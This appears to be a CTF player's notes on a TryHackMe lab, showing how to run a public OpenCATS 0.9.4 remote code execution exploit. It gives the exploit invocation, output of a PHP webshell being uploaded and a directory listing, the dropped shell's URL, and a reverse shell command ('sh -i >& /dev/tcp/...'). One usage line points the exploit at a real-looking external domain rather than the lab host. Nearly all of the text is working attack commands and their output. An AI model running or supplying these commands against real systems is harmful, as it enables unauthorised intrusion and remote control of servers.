## OpenCATS 0.9.4 - Remote Code Execution (RCE)

##### usage

```bash
/bin/python3 /home/splitunknown/Desktop/ctf/thm/empline/exploit.py http://www.indovisionglobal.com/itsource 'ls -la'
```

```bash
http://job.empline.thm ls -la
Current Available Openings, Recently Posted Jobs: 1
total jobs are: 1
Trying to upload revshell to 1 job id
[*] Exploit Uploaded successfully
total 36
drwxr-xr-x 2 www-data www-data 4096 Sep 24 17:29 .
drwxrwx--- 3 www-data www-data 4096 Sep 24 14:24 ..
-rwxrwxrwx 1 www-data www-data   67 Sep 24 17:20 etflajfmnp.php
-rwxrwxrwx 1 www-data www-data   67 Sep 24 17:22 itomfmfasy.php
-rwxrwxrwx 1 www-data www-data   21 Sep 24 17:28 jtoljgjuca.php
-rwxrwxrwx 1 www-data www-data   67 Sep 24 17:20 jufhahnqxk.php
-rwxrwxrwx 1 www-data www-data   67 Sep 24 17:20 nvpgubbyfn.php
-rwxrwxrwx 1 www-data www-data   25 Sep 24 17:29 psjkumuzut.php
-rwxrwxrwx 1 www-data www-data   67 Sep 24 17:20 ybnmwmpcve.php

http://job.empline.thm/upload/careerportaladd/psjkumuzut.php
```

##### RCE

```bash
 /bin/python3 /home/splitunknown/Desktop/ctf/thm/empline/exploit.py http://job.empline.thm "bash -c 'sh -i >& /dev/tcp/10.17.8.89/9005 0>&1'"
```

##### credit

https://www.exploit-db.com/exploits/50585
